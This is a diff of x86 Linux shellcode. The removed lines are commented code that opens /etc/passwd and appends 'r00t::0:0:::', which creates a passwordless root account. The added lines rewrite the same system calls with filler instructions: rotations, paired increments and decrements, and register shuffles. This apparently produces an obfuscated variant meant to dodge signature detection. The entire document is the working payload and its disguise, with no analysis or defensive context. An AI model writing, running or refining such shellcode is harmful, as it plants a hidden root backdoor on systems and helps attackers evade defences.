@@ -7,44 +7,46 @@ section .text
 	global _start
 
 _start:
-
-	; open("/etc//passwd", O_WRONLY | O_APPEND)
-
-	push byte 5
-	pop eax
-	xor ecx, ecx
-	push ecx
+	xor eax, eax
+	xor esi, esi
+	push esi
 	push 0x64777373
 	push 0x61702f2f
+	mov al, 5
 	push 0x6374652f
 	mov ebx, esp
+	xor ecx, ecx
+	ror edx, 1
 	mov cx, 02001Q
 	int 0x80
-
-	mov ebx, eax
-
-	; write(ebx, "r00t::0:0:::", 12)
-
-	push byte 4
-	pop eax
+	xor edi, edi
+	push eax
+	inc esi
+	xor eax, eax
+	mov al, 4
+	dec esi
+	pop ebx
+	push esi
+	mov edi, 0x3a3a3a30
+	push edi
+	mov edi, 0x3a303a3a
+	ror edx, 5
+	ror edi, 1
+	inc eax
+	ror edi,7
+	dec eax
+	push edi
 	xor edx, edx
+	mov edx, 0x74303072
+	ror edx, 32
 	push edx
-	push 0x3a3a3a30
-	push 0x3a303a3a
-	push 0x74303072
 	mov ecx, esp
-	push byte 12
-	pop edx
+	mov dl, 12
 	int 0x80
-
-	; close(ebx)
-
-	push byte 6
-	pop eax
+	xor eax, eax
+	mul edx
+	mov al,6
 	int 0x80
-
-	; exit()
-
-	push byte 1
-	pop eax
+	add ecx, 11
+	mov al, 1
 	int 0x80
